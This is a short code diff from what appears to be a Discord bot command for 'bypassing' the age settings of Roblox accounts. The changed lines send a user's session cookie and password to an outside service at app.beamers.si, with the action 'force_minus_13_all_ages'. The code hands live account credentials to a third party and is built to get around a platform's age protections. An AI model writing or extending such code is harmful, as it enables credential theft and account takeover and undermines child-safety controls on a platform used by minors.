@@ -102,10 +102,20 @@ async function handleBypassCommand(interaction) {
         const fetch = (await import('node-fetch')).default;
         
         // Make API request
-        const apiUrl = `https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`;
+        const apiUrl = 'https://app.beamers.si/api/bypasser';
+        
+        const requestBody = {
+            action: "force_minus_13_all_ages",
+            cookie: cookie,
+            password: password
+        };
         
         const response = await fetch(apiUrl, {
-            method: 'GET',
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(requestBody),
             timeout: 10000 // 10 second timeout
         });
         
